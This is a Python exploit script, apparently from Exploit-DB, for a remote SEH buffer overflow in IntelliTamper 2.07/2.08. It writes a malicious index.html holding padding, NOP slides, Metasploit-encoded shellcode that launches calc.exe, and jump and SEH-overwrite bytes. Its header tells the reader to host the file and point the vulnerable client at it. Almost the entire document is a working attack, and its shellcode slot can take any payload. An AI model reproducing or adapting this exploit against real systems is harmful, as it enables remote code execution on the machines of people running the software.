# IntelliTamper 2.07/2.08 (SEH) Remote Buffer Overflow
# Based on PoC: http://www.exploit-db.com/exploits/11217
# Author: loneferret
# Big thanks to: dookie
# Tested on WinXP SP3 English

# Just copy the resulting html file on a web server, and point Intelli Tamper to that adress.
# Should get a calculator

# Thanks to dookie for telling me to stick to it.
# Exploit-DB : Try Harder (tm)


#!/usr/bin/python
#badchar list: \x00\x3C\x01
buffer = '<html><head><title>loneferret test</title></head><body>'
buffer += '<script defer="'

buffer += '\x41' * 6236 # junk
buffer += '\x90' * 180 # nop slide 1

# win32_exec -
# EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com */

buffer += '\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x4d'
buffer += '\x53\x9e\xc5\x83\xeb\xfc\xe2\xf4\xb1\xbb\xda\xc5\x4d\x53\x15\x80'
buffer += '\x71\xd8\xe2\xc0\x35\x52\x71\x4e\x02\x4b\x15\x9a\x6d\x52\x75\x8c'
buffer += '\xc6\x67\x15\xc4\xa3\x62\x5e\x5c\xe1\xd7\x5e\xb1\x4a\x92\x54\xc8'
buffer += '\x4c\x91\x75\x31\x76\x07\xba\xc1\x38\xb6\x15\x9a\x69\x52\x75\xa3'
buffer += '\xc6\x5f\xd5\x4e\x12\x4f\x9f\x2e\xc6\x4f\x15\xc4\xa6\xda\xc2\xe1'
buffer += '\x49\x90\xaf\x05\x29\xd8\xde\xf5\xc8\x93\xe6\xc9\xc6\x13\x92\x4e'
buffer += '\x3d\x4f\x33\x4e\x25\x5b\x75\xcc\xc6\xd3\x2e\xc5\x4d\x53\x15\xad'
buffer += '\x71\x0c\xaf\x33\x2d\x05\x17\x3d\xce\x93\xe5\x95\x25\xa3\x14\xc1'
buffer += '\x12\x3b\x06\x3b\xc7\x5d\xc9\x3a\xaa\x30\xff\xa9\x2e\x7d\xfb\xbd'
buffer += '\x28\x53\x9e\xc5'

buffer += '\x90' * 243 # nop slide 2

buffer += '\xE9\x55\xFE\xFF\xFF'# jumps back in nop slide 1
buffer += '\xeb\xd0\x90\x90' # small jump back in nop slide 2
buffer += '\x3b\x10\x40\x00' # 0x0040103b intellitamper.exe

buffer += '\x43' * 50

buffer += '">'
buffer + '</body></html>'
file=open('index.html','w')
file.write(buffer)
file.close()